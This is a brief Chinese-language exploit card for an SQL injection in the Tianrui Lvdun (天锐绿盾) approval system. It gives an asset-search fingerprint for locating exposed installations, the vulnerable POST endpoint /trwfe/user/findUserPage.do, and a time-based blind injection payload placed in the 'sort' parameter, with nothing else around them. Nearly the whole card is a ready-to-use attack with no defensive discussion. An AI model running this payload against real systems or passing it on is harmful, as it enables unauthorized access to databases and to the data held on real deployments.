# 天锐绿盾findUserPage存在SQL注入漏洞

天锐绿盾 ｜ SQL注入 ｜ —
- **指纹**：`app="TIPPAY-绿盾审批系统"`
- **请求**：`POST /trwfe/user/findUserPage.do HTTP/1.1`

**Payload**
```
userName=&deptId=0&page=1&rows=10&sort=(SELECT * FROM (SELECT(SLEEP(5)))x)
```
- **响应特征**：200